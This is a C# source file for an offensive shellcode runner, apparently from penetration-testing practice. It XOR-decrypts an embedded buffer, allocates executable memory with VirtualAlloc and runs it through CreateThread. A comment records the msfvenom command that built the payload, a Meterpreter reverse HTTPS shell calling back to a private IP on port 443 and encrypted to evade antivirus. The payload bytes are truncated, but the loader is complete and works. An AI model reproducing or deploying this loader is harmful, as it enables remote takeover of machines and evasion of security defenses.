using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void runner()
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.222 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key "myKey"
            byte[] buf = new byte[752] {0x91,0x31,0xc8,0x81,...};

            // XOR key
            string key = "myKey";
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            // Decrypt into a new buffer
            byte[] decrypted = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                decrypted[i] = (byte)(buf[i] ^ keyBytes[i % keyBytes.Length]);
            }

            buf = decrypted;

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }
    }
}